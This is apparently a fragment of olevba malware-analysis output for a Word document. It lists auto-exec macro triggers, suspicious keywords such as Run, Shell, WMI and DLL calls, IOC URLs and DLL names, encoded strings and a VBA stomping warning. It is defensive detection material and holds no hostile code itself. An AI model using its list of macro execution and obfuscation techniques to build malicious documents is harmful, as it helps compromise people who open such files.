|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |btnBackup_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?                   |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?PRD=Word&SBP=ia&PVE|                                             |
|          |R=8.0&AR=templates  |                                             |
|IOC       |redir.dll           |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |wininf.dll          |Executable file name                         |
|IOC       |windot.dll          |Executable file name                         |
|Base64    |P-5                 |UC01                                         |
|String    |                    |                                             |
|Base64    |P]5                 |UF01                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

